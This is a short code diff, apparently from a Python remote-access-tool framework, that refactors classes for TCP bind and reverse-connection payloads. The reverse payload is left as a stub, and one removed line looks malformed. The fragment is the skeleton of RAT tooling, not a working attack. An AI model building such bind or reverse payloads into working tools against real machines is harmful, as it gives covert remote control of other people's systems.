@@ -17,7 +17,7 @@ class TCPPayload(rpc.RPCHandler):
         return super().handle_connection(conn)
 
 
-class PayloadRequestHandler(socketserver.BaseRequestHandler):
+class TCPPayloadRequestHandler(socketserver.BaseRequestHandler):
     Payload = TCPPayload
 
     def __init__(self, request, client_address, server, payload=None):
@@ -30,7 +30,7 @@ class PayloadRequestHandler(socketserver.BaseRequestHandler):
         self.payload.handle_connection(self.request)
 
 
-class TCPBindPayload(SimpleSocketRATPayload):
+class TCPBindPayload(TCPPayload):
 
     def __init__(self):
         self.server = socketserver.TCPServer(
@@ -41,9 +41,13 @@ class TCPBindPayload(SimpleSocketRATPayload):
         return self.server.serve_forever()
 
 
-class TCPReversePayload(sock.TCPClient, PayloadRPCHandler): Payload = SimpleSocketPayload 
+class TCPReversePayload(TCPPayload):
+
     def __init__(self, addr, retry_interval=1):
-        sock.TCPClient.__init__(self, addr, retry_interval)
+        self.client = TCPClient()
+
+    def connect_forever(self):
+        pass
 
 
 def uname():
